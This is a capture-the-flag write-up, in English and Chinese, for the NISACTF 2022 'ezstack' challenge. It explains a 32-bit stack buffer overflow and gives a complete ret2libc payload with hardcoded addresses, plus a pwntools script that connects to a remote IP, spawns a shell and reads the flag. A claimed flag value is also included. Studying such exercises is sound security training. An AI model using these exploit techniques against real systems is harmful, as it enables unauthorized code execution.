# CTF_PWN, [NISACTF 2022], 题目：ezstack
flag{pkjdxksbe4gxrpybc3u5cvfd}

The write-up in the image used port 20924 (old instance) and produced a different flag. The challenge you specified uses port 20984.
Same 32-bit ret2libc:

Buffer at ebp-0x48 → 72 bytes to saved EBP
system@plt = 0x8048390
"/bin/sh" = 0x804a024

Payload:
Pythonb"A"*72 + p32(0) + p32(0x8048390) + p32(0xdeadbeef) + p32(0x804a024)
Send to nc 211.65.197.50 20984, then cat flag.

# 可复用方法论：
解题过程如下：
1. 基本信息

题目：NISACTF 2022 - ezstack
二进制：32位 ELF（pwn）
远程：nc 211.65.197.50 20984（注意端口是 20984，不是截图里的 20924）

2. 漏洞分析
shell() 函数核心逻辑：
Cvoid shell() {
    char buf[0x48];               // 72 字节缓冲区
    system("echo Welcome to NISACTF");
    read(0, buf, 0x60);           // 读 96 字节 → 栈溢出
}
没有 canary、没有 PIE
NX 开启 → 不能直接 shellcode，用 ret2libc
关键布局：
buf 在 ebp-0x48
覆盖到返回地址需要：72 (buf) + 4 (saved ebp) = 76 字节

3. 关键信息
Bashsystem@plt   = 0x8048390
"/bin/sh"    = 0x804a024

4. 构造 payload
经典 32 位 ret2libc 格式：
Pythonpayload = b"A" * 72          # 填满缓冲区
payload += p32(0)            # 覆盖 saved ebp（随便写）
payload += p32(0x8048390)    # 返回地址 → system
payload += p32(0xdeadbeef)   # system 返回地址（随便）
payload += p32(0x804a024)    # system 的参数 → "/bin/sh"

5. 利用
Pythonfrom pwn import *
r = remote("211.65.197.50", 20984)
r.recvuntil(b"Welcome to NISACTF\n")
r.send(payload)
r.sendline(b"cat flag")
print(r.recv())
得到：
textflag{pkjdxksbe4gxrpybc3u5cvfd}
截图里的 flag 是旧实例（端口 20924）的，当前正确端口 20984 的 flag 就是上面这个。
